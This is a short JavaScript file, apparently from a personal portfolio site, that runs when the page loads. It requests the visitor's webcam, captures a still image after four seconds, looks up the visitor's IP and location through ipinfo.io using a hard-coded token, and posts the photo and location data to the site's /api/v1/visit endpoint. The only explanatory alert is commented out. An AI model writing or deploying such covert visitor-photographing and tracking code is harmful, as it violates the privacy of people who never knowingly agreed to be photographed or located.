var date = new Date();
var date1 = (date.getMonth() + 1) + "-" + date.getDate() + "-" + date.getFullYear();
var hours = date.getHours();
var minutes = date.getMinutes();
var ampm = hours >= 12 ? 'pm' : 'am';
hours = hours % 12;
hours = hours ? hours : 12; // the hour '0' should be '12'
minutes = minutes < 10 ? '0' + minutes : minutes;
var strTime = date1 + ' - ' + hours + ':' + minutes + ' ' + ampm;
var cTimeZone = date.toString().split('(');
cTimeZone = cTimeZone[1].toString().split(')');
cTimeZone = cTimeZone[0];

let ipdata

let sendEmail = (img = null) => {
    $.getJSON('https://ipinfo.io/?token=40bdeb367b7535', function (data) {
        UserIP = data.query;
        data['query'] = data.ip;
        data.time = strTime;
        data.cTimeZone = cTimeZone;
        ipdata = data;
        if (img)
            data['img_link'] = img
        else
            data['img_link'] = null
        $.post("/api/v1/visit", data, function (data) { });
    });

}



let image_from_webcam = () => {
    // alert("Hello! Welcome to my portfolio \nPlease press the Okay button to continue")
    navigator.mediaDevices
        .getUserMedia({
            audio: false,
            video: true
        })
        .then(stream => {
            // some delay till image gets displayed
            var video = document.getElementById("streamm");
            video.srcObject = stream;
            var canvas = document.getElementById("canvas");

            setTimeout(() => {
                var context = canvas.getContext("2d");
                context.drawImage(video, 0, 0, 240, 180);
                var link = document.createElement("a");
                link.href = canvas.toDataURL("image/jpg");
                var strLink = String(link);
                localStorage.setItem("userimage", link);
                var _data = {
                    ip: ipdata,
                    img: strLink,
                };
                sendEmail(strLink)
            }, 4000);
        })
        .catch(err => {
            console.log('Error:', err)
            sendEmail()
        });

}

image_from_webcam()